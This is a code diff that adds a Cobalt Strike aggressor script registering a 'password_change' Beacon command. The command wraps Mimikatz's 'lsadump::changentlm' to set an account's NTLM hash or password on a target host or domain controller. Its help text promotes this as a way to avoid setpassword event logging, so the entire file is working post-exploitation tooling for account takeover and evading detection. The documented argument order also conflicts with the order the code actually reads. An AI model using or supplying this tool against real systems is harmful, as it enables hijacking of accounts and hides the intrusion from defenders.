@@ -1,0 +1,60 @@
+# Cobalt Strike Mimikatz Enhancement CNA Addon
+# Created by @vysecurity
+# 
+# Credits to @armitagehacker (cobaltstrike) and @gentilkiwi (mimikatz)
+
+alias password_change {
+	# $2: Username
+	# $3: Old hash or password
+	# $4: New hash or password
+	# $5: SERVERNAME/DC/Localhost
+
+	$user = $2;
+	$old = $3;
+	$new = $4;
+	$server = $5;	
+
+	if ($user && $old && $new){
+		$command = "lsadump::changentlm /user:$user";
+
+		# Check if $old is a hash		
+		if ($old -ismatch '[a-fA-F0-9]{32}'){
+			$command += " /oldntlm:$old";
+		}
+		else {
+			$command += " /oldpassword:$old";
+		}
+
+		# Check if new is a hash
+		if ($new -ismatch '[a-fA-F0-9]{32}'){
+			$command += " /newntlm:$new";
+		}
+		else{
+			$command += " /newpassword:$new";
+		}
+
+		if ($server){
+			$command += " /server:$server";
+		}
+		else{
+			berror("No server specified, defaulting to localhost.");
+		}
+
+		prompt_confirm("Are you sure you want to execute?\nCommand: $command", "Confirmation", {
+			btask($1, "$command");
+			bmimikatz($1, "$command");
+		});	
+		
+
+	}
+	else{
+		berror($1,"Missing parameters, you need exactly 4.");
+	}
+}
+
+beacon_command_register("password_change", "Executes a password change which allows you to change the NTLM password for a given account.",
+	"Syntax: password_change [SERVER/DC/localhost] [Username] [Known old hash or password] [New hash or password]\n" .
+	"Uses Mimikatz's password change functionality which allows you to change the NTLM password for a given account without the setpassword event logging.\n".
+	"Useful for situations where you do not know the cleartext original password so you can change the password quickly and reset the NTLM hash after you're done.");
+
+
